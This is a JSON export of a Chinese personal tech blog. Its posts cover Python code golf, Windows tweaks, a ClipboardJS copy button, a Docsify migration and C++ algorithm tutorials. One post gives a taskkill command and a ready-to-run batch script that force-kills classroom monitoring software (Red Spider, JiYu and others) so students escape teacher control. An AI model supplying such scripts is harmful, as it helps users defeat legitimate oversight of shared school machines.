{"themeConfig":{"themeName":"gridea-theme-fly","postPageSize":10,"archivesPageSize":50,"siteName":"PanDaoxi's Tech Blog","siteDescription":"","footerInfo":"<p><b>Any great thought has a negligible beginning.</b></p><br><p>Copyright 2022-<span id=\"currentYear\"></span> by <b>PanDaoxi</b>. All rights reserved.</p>\n<br> <script src=\"/tech-blog/beauty.js\"></script>","showFeatureImage":true,"domain":"https://daoxi365.github.io/tech-blog/","postUrlFormat":"SLUG","tagUrlFormat":"SLUG","dateFormat":"YYYY-MM-DD","feedFullText":false,"feedCount":10,"archivesPath":"archives","postPath":"","tagPath":""},"posts":[{"content":"旧博客将下线，文章将迁至 https://daoxi365.pages.dev/（或 http://daoxi365.bloger.us.kg/）。此处不再更新，但发布的内容仍存，请谅解。 ","tags":[],"title":"Sunset","feature":"","link":"https://daoxi365.github.io/tech-blog/sunset/","stats":{"text":"1 min read","time":9000,"words":38,"minutes":1},"date":"2024-12-15 10:28:02","dateFormat":"2024-12-15"},{"content":"整活：记一次 Python 压行的经历。 为什么我要写这篇文章？ 众所周知，C++ 的所有非预处理可以压到一行，因为人家有分号。但是 Python 靠缩进！ 本来想写一个一次函数计算器的，但是为了方便想压行。 前不久，我了解到 Python 海象运算符。起初觉得这和 C++ 的特性一样嘛，经常会在记忆化搜索等类似的算法中用到。然后在实战中应用了一下，就突然发掘出了 Python 压行的玩法。 警告： 压行是为了整活，有时可以帮助减少代码体积。但是这样做很可能降低代码可读性，而且极难调试！ 尽量不要在开发使用这样的手段！ 需求和推论 原始代码 利用列表简化输入 合并条件判断 完整代码 需求和推论 需求：平面直角坐标系内，给出两个不同的点 A(x1,y1)A(x_1,y_1)A(x1​,y1​)、B(x2,y2)B(x_2,y_2)B(x2​,y2​)，求直线 ABABAB 的表达式。 方法：待定系数法。 设 yAB=kx+by_{AB}=kx+byAB​=kx+b. 将 A(x1,y1)A(x_1,y_1)A(x1​,y1​)、B(x2,y2)B(x_2,y_2)B(x2​,y2​) 代入，得 {y1=kx1+by2=kx2+b\\left\\{\\begin{matrix}y_1=kx_1+b\\\\y_2=kx_2+b\\end{matrix}\\right.{y1​=kx1​+by2​=kx2​+b​. 所以 {k=y2−y1x2−x1b=y1−kx1\\left\\{\\begin{matrix}k=\\frac{y_2-y_1}{x_2-x_1}\\\\b=y_1-kx_1\\end{matrix}\\right.{k=x2​−x1​y2​−y1​​b=y1​−kx1​​. 其他要求： 结果应该化成 y=kx+by=kx+by=kx+b 的形式。 输入共两行，每行两个数，用空格隔开，分别表示 AAA、BBB 两点的横、纵坐标。输入可能为小数。 k=±1k=\\pm1k=±1 时，化为 y=±x+by=\\pm x+by=±x+b 的形式。 b=0b=0b=0 时，化为 y=kxy=kxy=kx 的形式。 k=0k=0k=0 时，化为 y=by=by=b 的形式。 能化为整数的化为整数，不要有 1.01.01.0、2.02.02.0 等的数出现。 原始代码 _x1, _y1 = input(&quot;A &gt;&gt;&gt; &quot;).split() _x2, _y2 = input(&quot;B &gt;&gt;&gt; &quot;).split() x1, y1 = eval(_x1), eval(_y1) x2, y2 = eval(_x2), eval(_y2) k = (y2 - y1) / (x2 - x1) b = y1 - k * x1 if int(k) == float(k): k = int(k) if int(b) == float(b): b = int(b) if not k: print(&quot;y=&quot; + str(b)) exit() if not b: b = &quot;&quot; else: b = &quot;+&quot; + str(b) if k == 1: k = &quot;&quot; elif k == -1: k = &quot;-&quot; print(f&quot;y={k}x{b}&quot;) 冗杂，多余。 利用列表简化输入 我们知道，同一行输入了两个数，用空格隔开，因此我们使用 split() 函数分割成单独的字符串，再利用 evalevaleval 转化为对应的数据类型。 每一个点使用了两个临时变量，不妨改成列表。 因此我们试着写成这样： x1, y1 = [eval(i) for i in input(&quot;A &gt;&gt;&gt; &quot;).split()] x2, y2 = [eval(i) for i in input(&quot;B &gt;&gt;&gt; &quot;).split()] 这就利用了 for 循环和列表避免了临时变量。 合并条件判断 x, z, y = &quot;-&quot; if (k := (f := lambda x: int(x) if int(x) == float(x) else x)(k := (y2 - y1) / (x2 - x1))) == -1 else &quot;&quot; if k == 1 else k, &quot;&quot; if not (b := f(b := y1 - k * x1)) else b, [&quot;&quot;, &quot;+&quot;][b &gt; 0] 完整代码 (x1, y1), (x2, y2) = (f := lambda l: [eval(i) for i in input(f&quot;{l} &gt;&gt;&gt; &quot;).split()])(&quot;A&quot;), f(&quot;B&quot;) x, z, y = &quot;-&quot; if (k := (f := lambda x: int(x) if int(x) == float(x) else x)(k := (y2 - y1) / (x2 - x1))) == -1 else &quot;&quot; if k == 1 else k, &quot;&quot; if not (b := f(b := y1 - k * x1)) else b, [&quot;&quot;, &quot;+&quot;][b &gt; 0] print(f&quot;y={x}x{y}{z}&quot;) if k else print(f&quot;y={b}&quot;) ","tags":[{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"化繁为简 or 化简为繁","feature":"https://daoxi365.github.io/tech-blog//post-images/hua-fan-wei-jian-or-hua-jian-wei-fan.png","link":"https://daoxi365.github.io/tech-blog/hua-fan-wei-jian-or-hua-jian-wei-fan/","stats":{"text":"5 min read","time":254000,"words":895,"minutes":5},"date":"2024-07-18 19:05:02","dateFormat":"2024-07-18"},{"content":"发扬吾校精神！ 准备工作 软件 下载 Flash 8 软件：https://www.123pan.com/s/njglVv-rWRKA.html 密钥： WPD880-52632-87832-55330 图片 这个要靠您自己搜集了。 我可以提供帮助的是：Remove Background from Image for Free – remove.bg 字体 根据您的需要，非必选。 我提供免费的字体：https://www.123pan.com/s/njglVv-PBsKA.html 在 Flash 文件中完成操作 最终效果 ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"用 Flash 制作 PanDaoxi 同款校徽封面","feature":"https://daoxi365.github.io/tech-blog//post-images/yong-flash-zhi-zuo-pandaoxi-tong-kuan-tou-tu.png","link":"https://daoxi365.github.io/tech-blog/yong-flash-zhi-zuo-pandaoxi-tong-kuan-tou-tu/","stats":{"text":"1 min read","time":25000,"words":101,"minutes":1},"date":"2024-06-30 14:10:35","dateFormat":"2024-06-30"},{"content":"为了方便使用，我的 Windows 电脑进行了许多个性化设置。比如我重新排列了“新建”菜单各个项目的顺序。 如下图： 那么我是如何做到的呢？ 注册表修改 禁用继承 注册表修改 首先，你需要这样一个注册表地址： HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Discardable\\PostSetup\\ShellNew 该项下面有一个名为 Classes 的 REG_MULTI_SZ 值。 我的是这样的，就是现在的新建菜单的顺序，仅供参考： Folder .lnk .bmp .txt .md .bat .cpp .py .html .docx .pptx .xlsx 你需要做的是修改值，符合你的需求。 这个错误忽略即可。 禁用继承 你刚刚做出的修改可能会被系统修改回去。为此需要禁用继承。 分配完成，检查结果。 完成。 ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"重新排列 Windows“新建”菜单的顺序","feature":"https://daoxi365.github.io/tech-blog//post-images/chong-xin-pai-lie-windowsxin-jian-cai-dan-de-shun-xu.png","link":"https://daoxi365.github.io/tech-blog/chong-xin-pai-lie-windowsxin-jian-cai-dan-de-shun-xu/","stats":{"text":"1 min read","time":44000,"words":200,"minutes":1},"date":"2024-06-20 19:41:38","dateFormat":"2024-06-20"},{"content":"这是我的网站的一个新特性——“复制”按钮。 它使我的读者使用我的网站时会更加流畅、更加便利，网站可视化效果改善，进而读者的心情就会更好，然后就会给我评论。 现在我们来说说这是如何实现的。 插件 问题 美化 插件 我发现了 clipboard.js 这样一款插件。 网站内容十分简洁，教会了我们这样一些东西： CDN 引用： &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js&quot;&gt;&lt;/script&gt; 对于 btn 类下的元素，我们可以利用 JS 这样调用 clipboardjs： new ClipboardJS('.btn'); 根据网站给出的 DEMO，我们可以自行设计程序。 于是，我们就有了雏形： 问题 如果要把它直接利用到网站里面，就出现了问题。 观察刚才的程序可以知道，每个 &lt;button&gt; 和每个 &lt;pre&gt; 是以后者唯一确定的 id 联系起来的。如果出现多个代码块，就需要多个不同的 id 以及不同的按钮，并将它们一一对应起来。而且由于 Gridea 并未设置代码块的 id，所以就需要手动分配了。 这显然需要用到 JS 了。思考一番后，我写出了如下的 JS 程序： document.addEventListener('DOMContentLoaded', () =&gt; { const pres = document.querySelectorAll('pre'); pres.forEach((pre, index) =&gt; { // 创建唯一确定的的 id const uniqueId = `pre-${index + 1}`; pre.id = uniqueId; // 创建按钮 const button = document.createElement('button'); button.className = 'btn'; button.innerText = 'Copy'; // 设置 data-clipboard-target 属性 button.setAttribute('data-clipboard-target', `#${uniqueId}`); // 在 pre 标签之前插入按钮 pre.parentNode.insertBefore(button, pre); }); }); 把它放到刚才雏形的最后： 问题解决。把上面的解决方案放在 footer.ejs 中即可。 美化 刚才的普通按钮太丑了。添加一些 CSS 对它美化，请把它放在 main.less 中： /* main.less */ .btn { padding: 5px 10px; margin-bottom: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; } 再来，引用 Font Awesome，添加一个图标： &lt;!-- head.ejs --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.css&quot;&gt; &lt;!-- footer.ejs --&gt; &lt;script&gt; document.addEventListener('DOMContentLoaded', () =&gt; { const pres = document.querySelectorAll('pre'); pres.forEach((pre, index) =&gt; { // 创建唯一确定的的 id const uniqueId = `pre-${index + 1}`; pre.id = uniqueId; // 创建按钮 const button = document.createElement('button'); button.className = 'btn'; button.innerHTML = '&lt;span&gt;Copy&lt;/span&gt; &lt;span class=&quot;fa fa-copy&quot;&gt;&lt;/span&gt;'; // 设置 data-clipboard-target 属性 button.setAttribute('data-clipboard-target', `#${uniqueId}`); // 在 pre 标签之前插入按钮 pre.parentNode.insertBefore(button, pre); }); }); &lt;/script&gt; 可以，最终目的达到了。 现在把它放在 Gridea 里面试试，就有了最开始的那个样子。 完结撒花！~ ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"利用 ClipboardJS 实现代码块复制按钮","feature":"https://daoxi365.github.io/tech-blog//post-images/li-yong-clipboardjs-shi-xian-dai-ma-kuai-fu-zhi-an-niu.png","link":"https://daoxi365.github.io/tech-blog/li-yong-clipboardjs-shi-xian-dai-ma-kuai-fu-zhi-an-niu/","stats":{"text":"3 min read","time":173000,"words":667,"minutes":3},"date":"2024-06-20 19:12:20","dateFormat":"2024-06-20"},{"content":"众所周知，我把以前我在 CSDN 的博客放在了一个新站点上——CSDN Blog，作为我技术博客的一个分站。 链接： https://daoxi365.github.io/csdn-blogs/（新：CSDN Blog） https://pandaoxi.blog.csdn.net/（已注销的 CSDN 旧博客） 为什么不直接把文章放在 Gridea 下呢？原因有两个： 文章数量太多，不易操作； 文章太多时 Gitee Page 会崩掉。 因此我选择了 Docsify 这一静态文档网站生成器。 如果你问我，它好用吗？ ——好用是挺好用的，但是很麻烦。 概况 困难 1：文件名称和图片修改 困难 2：Docsify 美化 困难 3：上传到 Github 概况 在注销之前，我共有 420420420 篇原创文章需要收集起来放到新网站里。 通过一些手段导出来之后（手段）解压出来是 420420420 个 Markdown 文件。 本来 Docsify 是支持 markdown 的，但是 CSDN 的图片有防盗链设置，而且一些文件名也存在问题，不支持。比如说有一些文章标题里带空格，这是不被 Docsify 识别的。 因此我们需要克服很多困难…… 困难 1：文件名称和图片修改 由于文章太多，不能一个个地把图片弄下来，也不能手动修改每一个错误的文件名。 所以我使用了 Python 做批处理的活。这个 Python 文件的目的有以下几个： 匹配图片，替换图片； 修改文件名。 Luckily，我发现一个可以反防盗链的 API。只需要在链接前面添加上 https://pic.2ge.org/cdn/?url= 即可。 关于匹配，我直接让 ChatGPT 写了一个，真是太有实力啦！👍 我把这些博客放在文件夹 ./1 下，在上层目录添加文件夹 ./2，创建 ./maker.py： import os import re def extract_image_links_from_markdown(markdown_text): pattern = r'!\\[.*?\\]\\((.*?)\\)' image_links = re.findall(pattern, markdown_text) return image_links pths = [] names = [] for i, j, k in os.walk(&quot;1/&quot;): if not len(names): names = k for l in k: pths.append(os.path.join(i, l)) for i in range(0, len(pths)): r = &quot;&quot; names[i] = names[i].split(&quot;.md&quot;)[0].replace(&quot;~&quot;, &quot;-&quot;).replace(&quot; &quot;, &quot;&quot;) with open(pths[i], &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: r = f.read() for j in extract_image_links_from_markdown(r): r = r.replace(j, &quot;https://pic.2ge.org/cdn/?url=%s&quot; % j) with open(&quot;2/%s.md&quot; % names[i], &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: f.write(r) print(i, names[i]) x = &quot;&quot; for i in names: j = i x += &quot;- [%s](%s)\\n&quot; % (j, j) with open(&quot;2/_sidebar.md&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: f.write(x) input() 把 ./2 的所有文件复制到新博客下就行啦。 困难 2：Docsify 美化 按照官网教程一步步操作后发现页面好丑……于是我自己参照网络教程，简单地美化了一下： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;【PanDaoxi】CSDN Blog&lt;/title&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt; &lt;meta name=&quot;description&quot; content=&quot;Description&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; class=&quot;js-site-favicon&quot; type=&quot;image/svg+xml&quot; href=&quot;https://pandaoxi.gitee.io/tech-blog/favicon.svg&quot;&gt; &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/themes/vue.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/themes/prism.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;app&quot;&gt;Loading&lt;/div&gt; &lt;script&gt; window.$docsify = { name: 'PanDaoxi', loadSidebar: true, sidebarDisplayLevel: 1, alias: { '/.*/_sidebar.md': '/_sidebar.md' }, loadNavbar: true, coverpage: true, maxLevel: 5, subMaxLevel: 3, mergeNavbar: true, auto2top: true, latex: { inlineMath : [['$', '$'], ['\\\\(', '\\\\)']], displayMath : [['$$', '$$']], customOptions: {} }, pagination: { previousText: '上一章节', nextText: '下一章节', }, search: { paths: 'auto', placeholder: '搜索', placeholder: { '/zh-cn/': '搜索', '/': 'Type to search' }, noData: '找不到结果', depth: 4, hideOtherSidebarContent: false, namespace: 'Docsify-Guide', }, count:{ countable: true, position: 'top', margin: '10px', float: 'right', fontsize:'0.9em', color:'rgb(90,90,90)', language:'chinese', isExpected: true } } &lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://unpkg.com/docsify-latex@0.5.2/dist/docsify-latex.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/docsify.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/emoji.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/zoom-image.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/search.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-cpp.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-bash.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-python.min.js&quot;&gt;&lt;/script&gt; &lt;!--&lt;script src=&quot;https://unpkg.com/docsify-pagination@2.10.1/src/index.js&quot;&gt;&lt;/script&gt;--&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/docsify-copy-code/3.0.0/docsify-copy-code.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;//unpkg.com/docsify-count/dist/countable.js&quot;&gt;&lt;/script&gt; &lt;script&gt; onUpdated(() =&gt; { Prism.highlightAll(); }); onMounted(() =&gt; { Prism.highlightAll(); }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 还要在博客目录下创建 _coverpage.md、_navbar.md、_sidebar.md 等等。 困难 3：上传到 Github 我以前一直习惯于手动在 Github 上传文件，每次网页端最多可以上传 202020 个。太少了！ 但是我不会用 git。于是就探索 Git GUI。 这里不再赘述。 《通过GIT将本地项目上传到gitee》 《Git Gui》 就这样啦，拜拜！~ ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"在线文档 Docsify 的简单应用","feature":"https://daoxi365.github.io/tech-blog//post-images/zai-xian-wen-dang-docsify-de-jian-dan-ying-yong.png","link":"https://daoxi365.github.io/tech-blog/zai-xian-wen-dang-docsify-de-jian-dan-ying-yong/","stats":{"text":"7 min read","time":409000,"words":1353,"minutes":7},"date":"2024-04-21 14:59:52","dateFormat":"2024-04-21"},{"content":"关于什么是“红蜘蛛”：http://www.3000soft.net/products/product1.php 如果老师正在锁定你的屏幕，你需要锁定屏幕（Win+L），点击切换用户；但是你还是需要回到刚才的用户，并快速进行下一步。 以管理员身份，输入命令： taskkill /im redagent.exe /im rscheck.exe /im checkrs.exe /f 但是我不敢承诺你的老师是否会来线下找你。如果来找，我就帮不了你啦！ 此外，我制作了一个全平台破解工具，如果你不想敲命令，也可以带上 U 盘，运行以下批处理文件。 @echo off title 机房软件杀手 net session &gt;nul 2&gt;&amp;1 if %errorlevel% == 0 ( goto main ) else ( echo 错误： echo. echo 您需要使用管理员权限运行此程序！ echo 解决方法： echo ①退出此程序（按键盘上任意键退出程序）； echo ②右键单击此程序，选择“以管理员身份运行”； echo ③授予运行权限即可。 pause &gt; nul exit ) :main echo 程序将自动选择计算机上已经安装的电子课堂，但不保证一定退出成功。 echo 目前支持的机房软件：极域（青葡萄）电子教室、红蜘蛛、伽卡他卡、苏亚星。 echo 是否要立即开始关闭机房软件？（按键盘上任意键继续） echo （请小心老师私下武力解决） pause &gt; nul echo. tasklist | find /i &quot;StudentMain.exe&quot; if %errorlevel% == 0 ( echo 已发现：极域（青葡萄）电子教室 taskkill /im &quot;StudentMain.exe&quot; /t /f ) else ( echo 未发现：极域（青葡萄）电子教室 ) tasklist | find /i &quot;redAgent.exe&quot; if %errorlevel% == 0 ( echo 已发现：红蜘蛛软件 taskkill /im &quot;redAgent.exe&quot; /im &quot;checkrs.exe&quot; /im &quot;rscheck.exe&quot; /f ) else ( echo 未发现：红蜘蛛软件 ) tasklist | find /i &quot;student.exe&quot; if %errorlevel% == 0 ( echo 已发现：伽卡他卡、苏亚星 taskkill /im &quot;student.exe&quot; /f /t ) else ( echo 未发现：伽卡他卡、苏亚星 ) echo. echo 处理完成。（按键盘上任意键退出程序） echo 程序作者：Luogu @PanDaoxi pause &gt; nul exit ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"逃脱“红蜘蛛”等多媒体网络教室工具的方法","feature":"https://daoxi365.github.io/tech-blog//post-images/tao-tuo-hong-zhi-zhu-deng-duo-mei-ti-wang-luo-jiao-shi-gong-ju-de-fang-fa.webp","link":"https://daoxi365.github.io/tech-blog/tao-tuo-hong-zhi-zhu-deng-duo-mei-ti-wang-luo-jiao-shi-gong-ju-de-fang-fa/","stats":{"text":"3 min read","time":126000,"words":510,"minutes":3},"date":"2024-03-30 21:38:01","dateFormat":"2024-03-30"},{"content":"本文适用情况： U 盘硬件正常，原来还能用； 电脑能用，计算机管理没被禁用； 插入 U 盘后电脑发出提示音，但文件资源管理器无反应。 具体的解决步骤如下： 同时按下 Win + R，打开运行窗口： 输入 %windir%\\system32\\compmgmt.msc /s，回车运行，打开计算机管理页面： 系统工具 →\\to→ 右边栏：通用串行总线控制器 →\\to→ USB 大容量存储设备。左键单击选中它。 右键：卸载设备。 刷新之后一定是没有这一项才算成功。 重新插拔 U 盘，完成。 ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"解决一部分 Windows 下 U 盘插入无反应的问题","feature":"","link":"https://daoxi365.github.io/tech-blog/jie-jue-yi-bu-fen-windows-xia-u-pan-cha-ru-wu-fan-ying-de-wen-ti/","stats":{"text":"1 min read","time":33000,"words":157,"minutes":1},"date":"2023-11-19 21:54:22","dateFormat":"2023-11-19"},{"content":" 题面 具体思路 0x01 读题分析 0x02 输入和排序 0x03 DFS 0x04 BFS 0x05 完整程序 题面 此题看似是一道图论，实则比较基础。 只要掌握了基础的 DFS/BFS 即可爆切本题。 具体思路 0x01 读题分析 请帮助小 K 设计一种方法，使小 K 可以不重复、不遗漏的看完所有他能看到的文章。 对图分别进行 DFS 和 BFS，并输出遍历结果。 读到这两句话，我们就可以很清楚地知道此题考点：搜索和图论（有向图遍历）。 有一个小小的细节： 如果有很多篇文章可以参阅，请先看编号较小的那篇(因此你可能需要先排序)。 事实上这句话就相当于告诉了我们搜索的优先顺序，即从小到大搜。 0x02 输入和排序 根据上面分析，如果需要排序每一个结点的所有路径，可以使用 vector 数组。 这样的方式比较简单： // 存储：vector 数组 vector &lt;int&gt; maps[int(1e5) + 1]; // 输入：u 为起点，v 为终点 maps[u].push_back(v); // 排序：对编号为 i 的每一个结点的路径排序 sort(maps[i].begin(), maps[i].end()); 我们可以写出以下程序，实现输入数据和排序： cin &gt;&gt; n &gt;&gt; m; // 输入 n, m for(int i = 1; i &lt;= m; i++){ int u, v; cin &gt;&gt; u &gt;&gt; v; // 输入每一条路径 maps[u].push_back(v); // 离线存储 } for(int i = 1; i &lt;= n; i++){ sort(maps[i].begin(), maps[i].end()); } 0x03 DFS void dfs(int k = 1){ // k：当前遍历的结点编号 cout &lt;&lt; k &lt;&lt; &quot; &quot;; // 输出即可 for(auto i : maps[k]){ // 遍历：以 k 为起点，每一条路径的终点 if(!vis[i]){ // 如果没访问过就递归（不重复访问） vis[i] = true; dfs(i); } } } 0x04 BFS void bfs(){ queue &lt;int&gt; Q; vis[1] = true; Q.push(1); // 起点入队 while(!Q.empty()){ int fr = Q.front(); Q.pop(); cout &lt;&lt; fr &lt;&lt; &quot; &quot;; // 输出当前位置 for(auto i : maps[fr]){ // 遍历：每一条路径 if(!vis[i]){ // 没访问过 vis[i] = true; Q.push(i); } } } } 0x05 完整程序 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long LL; int n, m; vector &lt;int&gt; maps[int(1e5) + 1]; bool vis[int(1e5) + 1] = {false, true}; void dfs(int k = 1){ cout &lt;&lt; k &lt;&lt; &quot; &quot;; for(auto i : maps[k]){ if(!vis[i]){ vis[i] = true; dfs(i); } } } void bfs(){ cout &lt;&lt; endl; queue &lt;int&gt; Q; memset(vis, 0, sizeof(vis)); vis[1] = true; Q.push(1); while(!Q.empty()){ int fr = Q.front(); Q.pop(); cout &lt;&lt; fr &lt;&lt; &quot; &quot;; for(auto i : maps[fr]){ if(!vis[i]){ vis[i] = true; Q.push(i); } } } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m; for(int i = 1; i &lt;= m; i++){ int u, v; cin &gt;&gt; u &gt;&gt; v; maps[u].push_back(v); } for(int i = 1; i &lt;= n; i++){ sort(maps[i].begin(), maps[i].end()); } dfs(); bfs(); return 0; } ","tags":[{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"简单图论：Luogu P5318 查找文献","feature":"https://daoxi365.github.io/tech-blog//post-images/jian-dan-tu-lun-luogu-p5318-cha-zhao-wen-xian.png","link":"https://daoxi365.github.io/tech-blog/jian-dan-tu-lun-luogu-p5318-cha-zhao-wen-xian/","stats":{"text":"4 min read","time":197000,"words":699,"minutes":4},"date":"2023-11-04 21:57:15","dateFormat":"2023-11-04"},{"content":"排序和去重是数据分析中对数据常见的两种操作。 排序 简介 sort()\\texttt{sort()}sort() 实际应用 去重 集合（set\\texttt{set}set）——升序排序 +++ 去重 unique\\texttt{unique}unique 函数——只去重 题 排序 简介 sort()\\texttt{sort()}sort() 在 algorithm 头文件里，有一个 sort 函数，十分的方便。 运用了快速排序，其基本思想是分治，也可以加上二分的优化； 速度很快，达到 O(nlog⁡2n)O(n\\log_2 n)O(nlog2​n)。 至少比冒泡快多了。 函数有三个参数：sort(start, end, cmp)。 start 是排序起始地址，end 是排序结束地址的下一位。 cmp 支持用户自定义排序方法，也可以不填，就默认升序。 实际应用 具体地，我有一个数组 aaa。对它进行以下操作： int n, a[114514]; cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ cin &gt;&gt; a[i]; } 没错，其实就是个输入。 现在，输入的这些数据无序，如何让他们升序排列？ sort(a + 1, a + n + 1); 起始下标是 111，所以第一个参数是 a+1a+1a+1。 终止下标是 nnn，所以第二个参数是 a+n+1a + n + 1a+n+1。 当然你也可以多加一个取址： sort(&amp;a[1], &amp;a[n + 1]); 两种方法等价。 快速排序是通过比较的方式来排序。 类比于刚刚的方法，降序排列就需要使用自定义 cmp 来实现。 定义一个 bool 函数，名字随意，参数是要比较的两个东西： bool jntm(int kun1, int kun2){ // 瞎起名字 /* 返回 true → 后面的放在前面 返回 false → 不动 */ return kun1 &gt; kun2; // 较大的放在前面 } sort(a + 1, a + n + 1, jntm); 这个函数如果要是全部返回 true 值的话，整个数组将会以最中间的元素左右对称；如果全部返回 false 的话，整个数组不变。bool 的函数默认返回 false。 因此，如果想要实现排序的效果，需要比较前一个和后一个。 问题来了，如果对于一个 struct 结构体，cmp 如何使用？ Luogu P1093 / NOIp 2007 PJ\\texttt{Luogu P1093 / NOIp 2007 PJ}Luogu P1093 / NOIp 2007 PJ【奖学金】 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 301; struct stu{ int id, total, s1, s2, s3; } a[INF]; // 结构体数组 int n; bool cmp(stu x, stu y){ // 比较函数 if(x.total != y.total) return x.total &gt; y.total; // 先按总分降序排列 else if(x.s1 != y.s1) return x.s1 &gt; y.s1; // 再按照语文成绩降序排列 else return x.id &lt; y.id; // 最后是学号 } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ a[i].id = i; // 记录学号 cin &gt;&gt; a[i].s1 &gt;&gt; a[i].s2 &gt;&gt; a[i].s3; a[i].total = a[i].s1 + a[i].s2 + a[i].s3; // 计算总分 } sort(a + 1, a + n + 1, cmp); // 排序 for(int i = 1; i &lt;= 5; i++){ // 输出 cout &lt;&lt; a[i].id &lt;&lt; &quot; &quot; &lt;&lt; a[i].total &lt;&lt; endl; } return 0; } 去重 集合（set\\texttt{set}set）——升序排序 +++ 去重 什么是字符串 Hash\\texttt{Hash}Hash？ 对于数据规模较小的一组数，我们可以通过桶排序的方法去重。简单快捷，好写。 推广到一般情况，有的时候字符串 Hash\\texttt{Hash}Hash 生成的数会很大（或者本身的数据规模就很大），这时候就不能再利用桶了，可能会爆空间。 有一种数据集——集合 set\\texttt{set}set 可以一边升序排序，一边去重。 头文件：set。 同样，我有一个数组 aaa，离线输入了一些数据。 int n, a[114514]; cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ cin &gt;&gt; a[i]; } 我们就可以创建一个整数型集合储存、去重。 set &lt;int&gt; s(a + 1, a + n + 1); for(auto i : s){ cout &lt;&lt; i &lt;&lt; &quot; &quot;; } // 也可以创建一个迭代器，但是我不喜欢，因为太麻烦，也可以直接用 auto 代替 for(set &lt;int&gt; :: iterator i = s.begin(); i != s.end(); i++){ cout &lt;&lt; *i &lt;&lt; &quot; &quot;; } // 倒着遍历 for(auto i = s.rbegin(); i != s.rend(); i++){ cout &lt;&lt; i &lt;&lt; &quot; &quot;; } // 转存到 vector vector &lt;int&gt; v(s.begin(), s.end()); for(auto i : v){ cout &lt;&lt; i &lt;&lt; &quot; &quot;; } unique\\texttt{unique}unique 函数——只去重 头文件：algorithm。 本质是将重复的元素移动到数组的末尾，最后再将迭代器指向第一个重复元素的下标。 这个移动的过程也需要比较。 int n, a[114514]; cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ // 还是照常的输入 cin &gt;&gt; a[i]; } // 一般使用前需要先排序！！ sort(a + 1, a + n + 1); // 获取去重后数组的新长度 int len = unique(a + 1, a + n + 1) - a - 1; // 输出 for(int i = 1; i &lt;= len; i++){ cout &lt;&lt; a[i] &lt;&lt; &quot; &quot;; } 如果使用前需要先排序，那么就出现了一个新问题——如何按照输入顺序？ ——可以通过结构体解决。 const int INF = 114514; struct node {int num, id;} a[INF]; bool cmp(node kun1, node kun2){ return kun1.id &lt; kun2.id; // 输入早的放在前面 } // ...... int n; cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ cin &gt;&gt; a[i].num; a[i].id = i; // 记录输入顺序 } sort(a + 1, 